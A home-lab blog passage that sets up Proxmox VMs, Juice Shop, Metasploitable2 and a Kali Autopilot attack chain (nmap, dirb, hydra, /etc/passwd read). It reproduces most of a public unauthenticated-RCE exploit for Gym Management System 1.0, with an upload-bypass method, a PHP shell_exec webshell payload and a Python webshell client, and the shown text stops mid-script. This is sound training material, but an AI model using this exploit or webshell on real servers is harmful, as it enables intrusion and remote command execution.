</span></span><span class="line"><span class="cl"><span class="c1"># then check it worked with </span>
</span></span><span class="line"><span class="cl">ip a
</span></span><span class="line"><span class="cl">ip r
</span></span><span class="line"><span class="cl"><span class="c1"># make sure it looks like you want</span>
</span></span></code></pre></div><h3 id="windows-server-2019">Windows Server 2019</h3>
<p><a href="https://www.microsoft.com/en-us/evalcenter/download-windows-server-2019">Download</a> Currently Windows Server 2022 is out, and you can use that also. I may add it later if I have CPU, RAM, and drive space.<br>
If you download both be sure to name the file the version number/year.</p>
<p>Set the ID to 112 and Name to app02.
In OS be sure to change the Type to Microsoft Windows and the Version to 2019 it may look like &ldquo;10/2016/2019&rdquo;, add Qemu agent.
Then next change is change the disk size to 64GiB. Then give it 2 cores and 4096MB.</p>
<p>Select your Language and Keyboard and start the installation.
Select Standard Desktop. Accept the terms and do a custom install.
Select the drive and click &ldquo;next&rdquo;, it will install then load Customize settings.
You need to create a password that meets the windows requirements.
I will use &ldquo;Jmk112358!&rdquo; use the extra keys (the one that looks like an A keycap) to get Ctrl+Alt+Delete (the last one with three keys)
<img src="/old/MWS2019-login.png" alt="MWS2019-login.png"></p>
<p>&ldquo;yes&rdquo; to the networks pop  up. and close the Server manager pop up.
then adjust display by r-click on the desktop and select display, set it to &ldquo;1280x768&rdquo;
Then change network settings by r-clik on network settings select &ldquo;open internet &hellip;&rdquo;, &ldquo;Change our adapter&rdquo;, go to PIv4 properties.
<img src="/old/app02-networksettings.png" alt="app02-networksettings.png">
set the IP to 192.168.0.112 with 192.168.0.1 gateway and the 8.8.8.8 DNS and &ldquo;ok&rdquo; then close the windows. I like to open CMD and run</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">ipconfig
</span></span></code></pre></div><p>to confirm change was made.
We now need to install a Proxmox Windows VirtIO <a href="https://pve.proxmox.com/wiki/Windows_VirtIO_Drivers">Drivers</a> Go down to the Installation section and I selected the latest stable.
Once downloaded, upload into proxmox ISO folder and then go to &ldquo;app02&rdquo; -&gt; &ldquo;hardware&rdquo; and replace the MWS2019.iso with the virtio-win-x.x.xxx.iso
open file browser and go to CD -&gt; virtio&hellip; -&gt; guest-agent -&gt; qemu-ga-x86_64
<img src="/old/app02-virtio-install.png" alt="app02-virtio-install.png"></p>
<p>then go back to the main folder and install &ldquo;virtio-win-gt-x64&rdquo; all defaults.</p>
<p>Then we can go back to hardware in proxmox and remove the virtIO drive.
Restart, I selected &ldquo;Application Installation (Planned)&rdquo;.</p>
<h3 id="owasp-juice-shop">OWASP Juice Shop</h3>
<p>We will install on web01.</p>
<h6 id="from-video">From video</h6>
<p>First let&rsquo;s install some dependices.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt install nodejs npm
</span></span><span class="line"><span class="cl"><span class="c1"># note I got an error. They look to be 404&#39;s on the kali repository trying </span>
</span></span><span class="line"><span class="cl">sudo apt install nodejs npm --fix-missing
</span></span><span class="line"><span class="cl"><span class="c1"># I still had erros so for now I am runnung </span>
</span></span><span class="line"><span class="cl">npm -v 
</span></span><span class="line"><span class="cl">9.2.0
</span></span><span class="line"><span class="cl">nodejs -v
</span></span><span class="line"><span class="cl">v18.20.1
</span></span><span class="line"><span class="cl"><span class="c1"># to see the version, continuing usless more errors </span>
</span></span><span class="line"><span class="cl"><span class="c1"># now clone juice shop from github</span>
</span></span><span class="line"><span class="cl">git clone https://github.com/juice-shop/juice-shop.git
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> juice-shop
</span></span><span class="line"><span class="cl">npm install <span class="c1"># this will take time</span>
</span></span><span class="line"><span class="cl"><span class="c1"># I am getting a lot of deprecated packages warning  </span>
</span></span><span class="line"><span class="cl">npm start <span class="c1"># will start juice-shop</span>
</span></span></code></pre></div><p>this did not work for me.</p>
<h6 id="what-i-did">What I did</h6>
<p>Go to <a href="https://github.com/juice-shop/juice-shop?tab=readme-ov-file#from-sources">juice-shop-github</a>
I tried a few ways, and it did not work. Here is one of the ways I tried. My issue is with my Node.js and it is the latest.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/juice-shop/juice-shop/releases/download/v17.0.0/juice-shop-17.0.0_node18_linux_x64.tgz
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tar xf juice-shop-17.0.0_node18_linux_x64.tgz
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> juice-shop-17.0.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">npm start
</span></span></code></pre></div><p>So I moved on to docker. I have done this in the past. To install</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo install docker.io
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sudo docker run hello-world
</span></span><span class="line"><span class="cl"><span class="c1">########</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sudo docker pull bkimminich/juice-shop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sudo docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop
</span></span></code></pre></div><p>I have found that <a href="https://docs.docker.com/engine/install/ubuntu/">recommended method</a> to install docker from docker this did not work with my web01 server but the docker.io did.</p>
<p>Then navigate to localhost:3000 in the web browser to verify it is there.
In the video to set up a bash script to auto start
in the juice-shop folder</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">vim juice.sh
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/jmk/jucie-shop
</span></span><span class="line"><span class="cl">npm start
</span></span><span class="line"><span class="cl"><span class="c1"># save and exit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">chmod +x juice.sh
</span></span><span class="line"><span class="cl">sudo vim /etc/systemd/system/juice.service
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>OWASP Juice Shop
</span></span><span class="line"><span class="cl"><span class="nv">After</span><span class="o">=</span>network.target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>simple
</span></span><span class="line"><span class="cl"><span class="nv">User</span><span class="o">=</span>jmk
</span></span><span class="line"><span class="cl"><span class="nv">Group</span><span class="o">=</span>jmk
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/bin/bash /home/jmk/juice-shop/juice.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> juice
</span></span></code></pre></div><p>I am trying it with docker that currently need &ldquo;sudo&rdquo; to run, so</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">vim juice.sh
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/jmk/
</span></span><span class="line"><span class="cl">sudo docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop
</span></span><span class="line"><span class="cl">--- <span class="c1"># save and exit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">chmod +x juice.sh
</span></span><span class="line"><span class="cl">sudo vim /etc/systemd/system/juice.service
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>OWASP Juice Shop
</span></span><span class="line"><span class="cl"><span class="nv">After</span><span class="o">=</span>network.target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>simple
</span></span><span class="line"><span class="cl"><span class="nv">User</span><span class="o">=</span>root <span class="c1"># fix this</span>
</span></span><span class="line"><span class="cl"><span class="nv">Group</span><span class="o">=</span>root <span class="c1"># fix this</span>
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/bin/bash /home/jmk/juice.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
</span></span><span class="line"><span class="cl">--- <span class="c1"># save and exit</span>
</span></span><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> juice
</span></span></code></pre></div><p>I rebooted and it works.</p>
<h6 id="note-1">Note:</h6>
<p>This is NOT a good way to do it. User &ldquo;jmk&rdquo; can edit a file that is executed by root.  &ndash; I will fix this after I have exploited it. &ndash; A possible better solution is allowing the user &ldquo;jmk&rdquo; to run docker without sudo, then remove sudo from the juice.sh file? I need to look up how to do this properly.</p>
<h3 id="metasplotable-vm">Metasplotable VM</h3>
<p>Lets create a new VM with user ID 113 and name metasploitable
On the OS scree &ldquo;Do not use any media&rdquo;
All other are defaults and do not start.
Now we remove the hard disk by going to &ldquo;Hardware&rdquo; select hard disk and &ldquo;detach&rdquo;
Also remove the unused &ldquo;disk 0&rdquo; entry the same way.
now in your kali vm download <a href="https://sourceforge.net/projects/metasploitable/files/latest/download">metasploitable2</a>
then unzip it and cd into it.
now we are going to set up a web server. I would check my IP then start it</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ip a
</span></span><span class="line"><span class="cl">python3 -m http.server
</span></span></code></pre></div><p>this will run on port 8000 by default.
in the shell on your primary node in proxmox</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget http://192.168.0.202:8000/Metasploitable.vmdk
</span></span></code></pre></div><p><img src="/old/metasplotable2-upload.png" alt="metasplotable2-upload.png">
now still in that shell run</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">qm importdisk <span class="m">113</span> Metasploitable.vmdk local-lvm -format qcow2
</span></span></code></pre></div><p>Do not click away in proxmox before the upload is completed, I had to run the command again when I did.
Once complete go to the metasplotable vm and you will see a disk0 edit it to STAT and add. Then go to Options and uncheck the existing boot order and select the sata0.</p>
<p>Now we can start it and we have a running Metasplotable2.
To get the IP addres login to the console with &ldquo;msfadmin:msfadmin&rdquo;
and run <code>ip a</code> then in a web browser you can navigate to that page and start having fun. (For more fun scan your network and try to find it.)</p>
<h6 id="other-servers">Other servers</h6>
<p>So just like we just did for Metasploitable2 we can do for may of the boxes on <a href="https://www.vulnhub.com/">VulnHub</a> and other sources that have vmdk&rsquo;s.</p>
<h2 id="setting-up-kali-autopilot-scripts">Setting up kali-autopilot scripts</h2>
<p>This is not about the attack as much as training what to look for as a defender.
I see a value as an attacker, that I want to know how loud my attack is to the defender.
In kali-purple, <a href="https://www.kali.org/tools/kali-autopilot/">kali-autopilot</a> is installed with all the other packages.</p>
<p>in the Top left box let&rsquo;s add a new Attack Script and call it &ldquo;learning&rdquo;.
You can see that when you add it the Variables middle box updates to <a>learning</a>, this is where we add our subnet 192.168.0.0/24, web01 192.168.0.202, and app01 192.168.0.111.
we can save it in the Attack Scripts section in the top left.
Settings is in the top right, are pretty self-explanatory. For more information go to the link above.
Now we fill it in.
<img src="/old/kali-auto.png" alt="kali-auto.png">
STAGE sets a delay
OS command in on our host system.
We first run nmap -sn {subnet}, then nmap -PS -sV {on both web01 and app01}, the dirb on web01, then hydra on app01 with user and password file, then ssh app01, then run <a href="https://exploit-db.com/exploits/48506">exploit</a>, then on the guest system cat /etc/passwd then exit.</p>
<p>now that it is set up lets Generate the script see 4th button on the bottom.
now lets move the script to our kali box (I am thinking we may have been able to run this on our kali-purple box were it was made but this is what the class did.)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">cd</span> kali-autopilot/learning <span class="c1"># this is where the script is genrated</span>
</span></span><span class="line"><span class="cl">ip a <span class="c1"># to display our IP</span>
</span></span><span class="line"><span class="cl">python3 -m http.server <span class="c1"># to host on web server port 8000</span>
</span></span></code></pre></div><p>on Kali box</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mkdir kali-autopilot
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> kali-autopilot
</span></span><span class="line"><span class="cl">mkdir learning
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> learning
</span></span><span class="line"><span class="cl">wget 192.168.0.102:8000/learning.py
</span></span></code></pre></div><p>The class has an Exercise Files and I was unable to download them. So I will make some. Save as pass.txt just be sure the real password is in it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Password
</span></span><span class="line"><span class="cl">Pa55W0rd
</span></span><span class="line"><span class="cl">NotA5555
</span></span><span class="line"><span class="cl">Qwert12345
</span></span><span class="line"><span class="cl">12345QWERT
</span></span><span class="line"><span class="cl">Nooooo01
</span></span><span class="line"><span class="cl">WildCat1010
</span></span></code></pre></div><p>and download the file for the <a href="https://www.exploit-db.com/download/48506">exploit</a> and rename to exgym.py</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://www.exploit-db.com/download/48506
</span></span><span class="line"><span class="cl">cp <span class="m">48506</span> exgym.py <span class="c1"># I like to keep a copy unchanged for truble shooting. </span>
</span></span></code></pre></div><p>Save all in the same folder.
lets create the &ldquo;akhtar:WildCat1010&rdquo; in app01</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo adduser akhtar
</span></span><span class="line"><span class="cl"><span class="c1"># When propted for password for new user</span>
</span></span><span class="line"><span class="cl">WildCat1010
</span></span><span class="line"><span class="cl"><span class="c1"># all other fileds can be left blank</span>
</span></span></code></pre></div><p><em>We will not be able to ssh in with this user, we forgot to enable that</em>
<a href="https://linuxconfig.org/how-to-enable-and-disable-ssh-for-user-on-linux"><em>To enable ssh.</em></a></p>
<p>Now back to our kali box.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python3 learning.py
</span></span><span class="line"><span class="cl"><span class="c1"># I had an error to fix by</span>
</span></span><span class="line"><span class="cl">pip install surge
</span></span><span class="line"><span class="cl"><span class="c1"># then rerun </span>
</span></span><span class="line"><span class="cl">python3 learning.py
</span></span></code></pre></div><p>once at the STAGE go to
&ldquo;localhost/check&rdquo; username:password &ldquo;offsec:offsec&rdquo;
To move it on we go to &ldquo;localhost/set?mutex=1&rdquo;
we can go back to our terminal to follow along with the attack.
My file has some errors, It may be a python2 to python3 issues I will look at it more later.</p>
<p>In my hydra attack above I did not put &lsquo;akhtar&rsquo; that may be one of the issues. Also, &ldquo;ssh://$IP&rdquo; I left off one of the &lsquo;/&rsquo; to fix I edited the learning.py file, or you can fix it in kali-autopilot and generate (This still did not work for me, I don&rsquo;t know the python library used so not sure how to fix yet.).
My exgym.py file is still not running I will need to convert to python3. I did this the easy way and asked a chatbot to do it for me. It worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># Exploit Title: Gym Management System 1.0 - Unauthenticated Remote Code Execution</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Author: Bobby Cooke</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Date: 2020-05-21</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Vendor Homepage: https://projectworlds.in/</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Software Link: https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Version: 1.0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Tested Using: Python 2.7.17</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Vulnerability Description: </span>
</span></span><span class="line"><span class="cl"><span class="c1">#   Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Details:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   1. Access the &#39;/upload.php&#39; page, as it does not check for an authenticated user session.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   2. Set the &#39;id&#39; parameter of the GET request to the desired file name for the uploaded PHP file.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     - `upload.php?id=kamehameha`</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     /upload.php:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        4 $user = $_GET[&#39;id&#39;];</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       34       move_uploaded_file($_FILES[&#34;file&#34;][&#34;tmp_name&#34;],</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       35       &#34;upload/&#34;. $user.&#34;.&#34;.$ext);</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   3. Bypass the extension whitelist by adding a double extension, with the last one as an acceptable extension (png).</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     /upload.php:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        5 $allowedExts = array(&#34;jpg&#34;, &#34;jpeg&#34;, &#34;gif&#34;, &#34;png&#34;,&#34;JPG&#34;);</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        6 $extension = @end(explode(&#34;.&#34;, $_FILES[&#34;file&#34;][&#34;name&#34;]));</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       14 &amp;&amp; in_array($extension, $allowedExts))</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   4. Bypass the file type check by modifying the &#39;Content-Type&#39; of the &#39;file&#39; parameter to &#39;image/png&#39; in the POST request, and set the &#39;pupload&#39; paramter to &#39;upload&#39;.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        7 if(isset($_POST[&#39;pupload&#39;])){</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        8 if ((($_FILES[&#34;file&#34;][&#34;type&#34;] == &#34;image/gif&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       11 || ($_FILES[&#34;file&#34;][&#34;type&#34;] == &#34;image/png&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   5. In the body of the &#39;file&#39; parameter of the POST request, insert the malicious PHP code:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       &lt;?php echo shell_exec($_GET[&#34;telepathy&#34;]); ?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   6. The Web Application will rename the file to have the extension with the second item in an array created from the file name; seperated by the &#39;.&#39; character.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       30           $pic=$_FILES[&#34;file&#34;][&#34;name&#34;];</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       31             $conv=explode(&#34;.&#34;,$pic);</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       32             $ext=$conv[&#39;1&#39;];</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   - Our uploaded file name was &#39;kaio-ken.php.png&#39;. Therefor $conv[&#39;0&#39;]=&#39;kaio-ken&#39;; $conv[&#39;1&#39;]=&#39;php&#39;; $conv[&#39;2&#39;]=&#39;png&#39;; </span>
</span></span><span class="line"><span class="cl"><span class="c1">#   7. Communicate with the webshell at &#39;/upload.php?id=kamehameha&#39; using GET Requests with the telepathy parameter.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Fore</span><span class="p">,</span> <span class="n">Style</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">webshell</span><span class="p">(</span><span class="n">SERVER_URL</span><span class="p">,</span> <span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">WEB_SHELL</span> <span class="o">=</span> <span class="n">SERVER_URL</span> <span class="o">+</span> <span class="s1">&#39;upload/kamehameha.php&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">getdir</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;telepathy&#39;</span><span class="p">:</span> <span class="s1">&#39;echo %CD%&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r2</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">WEB_SHELL</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">getdir</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">status</span> <span class="o">=</span> <span class="n">r2</span><span class="o">.</span><span class="n">status_code</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">status</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">Style</span><span class="o">.</span><span class="n">BRIGHT</span> <span class="o">+</span> <span class="n">Fore</span><span class="o">.</span><span class="n">RED</span> <span class="o">+</span> <span class="s2">&#34;[!] &#34;</span> <span class="o">+</span> <span class="n">Fore</span><span class="o">.</span><span class="n">RESET</span> <span class="o">+</span> <span class="s2">&#34;Could not connect to the webshell.&#34;</span> <span class="o">+</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r2</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s1">&#39;[+] &#39;</span> <span class="o">+</span> <span class="n">Fore</span><span class="o">.</span><span class="n">RESET</span> <span class="o">+</span> <span class="s1">&#39;Successfully connected to webshell.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cwd</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;[CDEF].*&#39;</span><span class="p">,</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cwd</span> <span class="o">=</span> <span class="n">cwd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;&gt; &#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">term</span> <span class="o">=</span> <span class="n">Style</span><span class="o">.</span><span class="n">BRIGHT</span> <span class="o">+</span> <span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span> <span class="o">+</span> <span class="n">cwd</span> <span class="o">+</span> <span class="n">Fore</span><span class="o">.</span><span class="n">RESET</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">thought</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">term</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">command</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;telepathy&#39;</span><span class="p">:</span> <span class="n">thought</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">WEB_SHELL</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">command</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">status</span> <span class="o">=</span> <span class="n">r2</span><span class="o">.</span><span class="n">status_code</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">status</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">r2</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">response2</span> <span class="o">=</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">response2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">Exiting.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">formatHelp</span><span class="p">(</span><span class="n">STRING</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Style</span><span class="o">.</span><span class="n">BRIGHT</span> <span class="o">+</span> <span class="n">Fore</span><span class="o">.</span><span class="n">RED</span> <span class="o">+</span> <span class="n">STRING</span> <span class="o">+</span> <span class="n">Fore</span><span class="o">.</span><span class="n">RESET</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">header</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">BL</span> <span class="o">=</span> <span class="n">Style</span><span class="o">.</span><span class="n">BRIGHT</span> <span class="o">+</span> <span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span>
</span></span><span class="line"><span class="cl">    <span class="n">RS</span> <span class="o">=</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span>
</span></span><span class="line"><span class="cl">    <span class="n">FR</span> <span class="o">=</span> <span class="n">Fore</span><span class="o">.</span><span class="n">RESET</span>
</span></span><span class="line"><span class="cl">    <span class="n">SIG</span> <span class="o">=</span> <span class="n">BL</span> <span class="o">+</span> <span class="s1">&#39;            /</span><span class="se">\\\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">RS</span>
</span></span><span class="line"><span class="cl">    <span class="n">SIG</span> <span class="o">+=</span> <span class="n">Fore</span><span class="o">.</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s1">&#39;/vvvvvvvvvvvv &#39;</span> <span class="o">+</span> <span class="n">BL</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">FR</span> <span class="o">+</span> <span class="s1">&#39;--------------------------------------,</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SIG</span> <span class="o">+=</span> <span class="n">Fore</span><span class="o">.</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s1">&#39;`^^^^^^^^^^^^&#39;</span> <span class="o">+</span> <span class="n">BL</span> <span class="o">+</span> <span class="s1">&#39; /&#39;</span> <span class="o">+</span> <span class="n">FR</span> <span class="o">+</span> <span class="s1">&#39;============&#39;</span> <span class="o">+</span> <span class="n">Fore</span><span class="o">.</span><span class="n">RED</span> <span class="o">+</span> <span class="s1">&#39;BOKU&#39;</span> <span class="o">+</span> <span class="n">FR</span> <span class="o">+</span> <span class="s1">&#39;=====================&#34;</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SIG</span> <span class="o">+=</span> <span class="n">BL</span> <span class="o">+</span> <span class="s1">&#39;            \/&#39;</span> <span class="o">+</span> <span class="n">RS</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">SIG</span>
</span></span><span class="line"><span class="cl">
